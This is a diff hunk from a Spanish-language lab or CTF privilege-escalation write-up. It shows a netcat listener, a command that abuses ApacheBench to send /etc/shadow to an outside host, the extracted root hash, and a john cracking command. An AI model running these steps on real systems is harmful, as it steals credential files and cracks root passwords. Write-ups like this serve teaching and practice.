@@ -162,25 +162,21 @@ Este binario está en **GTFOBins**, así que es fácil escalar a root. Quería p
 Viendo cómo funciona, simplemente tenemos que crear un listener con netcat y enviarnos un archivo del sistema. La vía es el `/etc/shadow`, que contiene el hash de root, y le haremos fuerza bruta con `john`.
 
 Primero abrimos el listener:
-
 ```bash
 nc -lvnp 4444
 ```
 
 Seguidamente nos enviamos el archivo:
-
 ```bash
 /usr/bin/ab -p /etc/shadow http://192.168.93.128:4444/shadow
 ```
 
 Lo recibimos. Cogemos el hash de root y le quitamos todo lo innecesario:
-
 ```
 root:$y$j9T$06k8CpwIHWwvgOizpHNH30$VTfTBXChehaq8kPRI5Lhh54LIRXdbkoP3ZxOGQaxqZ0
 ```
 
 Si hacemos fuerza bruta sin especificar el tipo de hash, no funcionará correctamente porque no le indicamos el formato. Cuando atacamos un hash del sistema como el del `/etc/shadow`, es necesario especificar el formato; en este caso es `crypt`:
-
 ```bash
 john --format=crypt --wordlist=/usr/share/wordlists/rockyou.txt hash
 ```
